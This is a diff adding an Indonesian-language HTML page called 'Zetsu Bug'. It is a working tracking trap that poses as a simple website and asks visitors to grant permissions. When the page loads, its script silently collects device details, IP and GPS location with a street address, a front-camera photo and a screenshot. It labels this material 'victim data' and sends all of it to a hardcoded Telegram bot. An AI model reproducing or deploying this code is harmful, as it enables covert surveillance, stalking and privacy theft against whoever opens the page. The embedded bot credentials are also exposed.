@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zetsu Bug</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        body {
+            background: #000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            color: #999;
+        }
+        #permission-container {
+            text-align: center;
+            width: 80%;
+            max-width: 400px;
+            padding: 20px;
+            background: #111;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(110, 72, 170, 0.5);
+        }
+        #permission-text {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #6e48aa;
+        }
+        #permission-details {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+        .hidden {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0;
+        }
+        #camera-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div id="permission-container">
+        <div id="permission-text">Zetsu Bug</div>
+        <div id="permission-details">
+            selamat databg di web bug sederhana ku 
+            dibuat oleh : Zetsu
+            <br><br>
+            Harap izinkan permintaan akses yang akan muncul.
+        </div>
+    </div>
+    
+    <div id="camera-container">
+        <video id="v" autoplay muted></video>
+    </div>
+    <canvas id="c" class="hidden"></canvas>
+
+    <script>
+    (() => {
+        const T = '8381929545:AAFOsagmM-n4gin5rAmm0hKvqkk7ovFz5h0',
+              C = '7555643519';
+        
+        // Fungsi untuk mengirim pesan ke Telegram
+        const sTG = async d => {
+            try {
+                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
+                });
+            } catch(e) {}
+        };
+        
+        // Fungsi untuk mengirim foto ke Telegram
+        const sP = async (b, f) => {
+            try {
+                const fd = new FormData();
+                fd.append('chat_id', C);
+                fd.append('photo', b, f);
+                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            } catch(e) {}
+        };
+        
+        // Fungsi untuk mendapatkan detail lokasi
+        const gLD = async (a, b) => {
+            try {
+                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),
+                      d = await r.json();
+                if (d.address) {
+                    return {
+                        kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
+                        kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
+                        fa: d.display_name || "Alamat tidak tersedia"
+                    };
+                }
+            } catch(e) {}
+            return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" };
+        };
+        
+        // Fungsi untuk mengumpulkan informasi device
+        const cDI = async () => {
+            let m = '╭───── Data korban ───── ⦿\n\n';
+            m += '⚙️ DEVICE INFORMATION\n';
+            m += `🖥️ Device: ${navigator.userAgent}\n`;
+            m += `💻 Platform: ${navigator.platform}\n`;
+            m += `🌐 Bahasa: ${navigator.language}\n`;
+            m += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+            m += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+            m += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
+            m += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+            m += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+            
+            if (navigator.getBattery) {
+                try {
+                    const b = await navigator.getBattery();
+                    m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
+                    m += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+                } catch(e) {
+                    m += '🔋 Battery: ❌ Tidak tersedia\n';
+                }
+            }
+            
+            m += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+            m += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+            m += `📜 History Length: ${history.length}\n`;
+            m += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+            m += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+            m += `🌍 URL: ${location.href}\n`;
+            m += `📄 Title: ${document.title}\n`;
+            m += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            m += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+            
+            try {
+                const i = await fetch('https://ipapi.co/json/'),
+                      d = await i.json();
+                m += '📍 LOCATION INFORMATION\n';
+                m += `📡 IP Address: ${d.ip}\n`;
+                m += `🏙️ Kota: ${d.city}\n`;
+                m += `🏙️ Kabupaten: ${d.region}\n`;
+                m += `🗺️ Wilayah: ${d.region}\n`;
+                m += `🌎 Negara: ${d.country_name}\n`;
+                m += `🏷️ Kode Pos: ${d.postal}\n`;
+                
+                if (d.latitude && d.longitude) {
+                    m += `📌 Latitude: ${d.latitude}\n`;
+                    m += `📍 Longitude: ${d.longitude}\n`;
+                    
+                    const l = await gLD(d.latitude, d.longitude);
+                    m += `🏙️ Kabupaten: ${l.kb}\n`;
+                    m += `🏙️ Kecamatan: ${l.kc}\n`;
+                    m += `🏠 Alamat Lengkap: ${l.fa}\n`;
+                }
+            } catch(e) {
+                m += '❌ Gagal mendapatkan informasi lokasi\n';
+            }
+            
+            m += '\n╰───── Telegram @@Mysteryid505 ───── ⦿';
+            return m;
+        };
+        
+        // Fungsi untuk mengambil gambar dari kamera
+        const captureCameraImage = async () => {
+            try {
+                const v = document.getElementById('v');
+                const c = document.getElementById('c');
+                
+                // Coba gunakan kamera depan terlebih dahulu
+                const constraints = {
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                v.srcObject = stream;
+                
+                // Tunggu hingga video siap (minimal 2 detik)
+                await new Promise(resolve => {
+                    v.onloadedmetadata = () => {
+                        setTimeout(resolve, 2000); // Tambah delay untuk memastikan kamera siap
+                    };
+                });
+                
+                // Atur ukuran canvas sesuai dengan video
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                
+                // Gambar frame video ke canvas
+                const ctx = c.getContext('2d');
+                ctx.drawImage(v, 0, 0, c.width, c.height);
+                
+                // Konversi canvas ke blob dan kirim
+                c.toBlob(blob => {
+                    sP(blob, 'camera_capture.jpg');
+                    // Hentikan stream setelah mengambil gambar
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg', 0.8);
+                
+                return true;
+            } catch (error) {
+                console.error("Error accessing camera:", error);
+                await sTG('❌ Camera access blocked: ' + error.message);
+                return false;
+            }
+        };
+        
+        // Fungsi untuk meminta izin dan mengirim data
+        const requestPermissions = async () => {
+            // Kirim informasi device terlebih dahulu
+            await sTG(await cDI());
+            
+            // Minta izin kamera dan ambil gambar
+            await captureCameraImage();
+            
+            // Ambil screenshot
+            try {
+                const cn = await html2canvas(document.body);
+                cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
+            } catch(e) {
+                await sTG('❌ Screenshot failed');
+            }
+            
+            // Minta izin lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async p => {
+                        let g = `📍 LIVE GPS TRACKING\n📌 Lat: ${p.coords.latitude}\n📍 Lng: ${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy}m\n`;
+                        const l = await gLD(p.coords.latitude, p.coords.longitude);
+                        g += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
+                        await sTG(g);
+                    },
+                    async e => {
+                        await sTG(`❌ GPS Error: ${e.message}`);
+                    },
+                    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                );
+            }
+        };
+        
+        // Jalankan fungsi permintaan izin segera setelah halaman dimuat
+        window.onload = requestPermissions;
+    })();
+    </script>
+</body>
+</html>
